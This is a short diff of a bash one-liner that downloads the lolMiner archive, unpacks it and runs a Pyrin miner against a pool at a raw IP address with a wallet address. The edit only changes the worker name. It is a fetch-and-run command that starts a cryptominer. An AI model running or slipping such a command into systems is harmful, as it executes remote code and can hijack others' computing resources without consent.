@@ -1,2 +1,2 @@
 #bash
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.81/lolMiner_v1.81_Lin64.tar.gz && tar -xf lolMiner_v1.81_Lin64.tar.gz && rm lolMiner_v1.81_Lin64.tar.gz && cd 1.81 && ./lolMiner -a PYRIN -p 207.154.232.236:80 --user pyrin:qzktytxddpgfuk6f2njlj79t7d5rgurrw5qjnue555t80tckesvxv9x5unm7x.erlandi --no-cl
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.81/lolMiner_v1.81_Lin64.tar.gz && tar -xf lolMiner_v1.81_Lin64.tar.gz && rm lolMiner_v1.81_Lin64.tar.gz && cd 1.81 && ./lolMiner -a PYRIN -p 207.154.232.236:80 --user pyrin:qzktytxddpgfuk6f2njlj79t7d5rgurrw5qjnue555t80tckesvxv9x5unm7x.edrivetokenbsc --no-cl
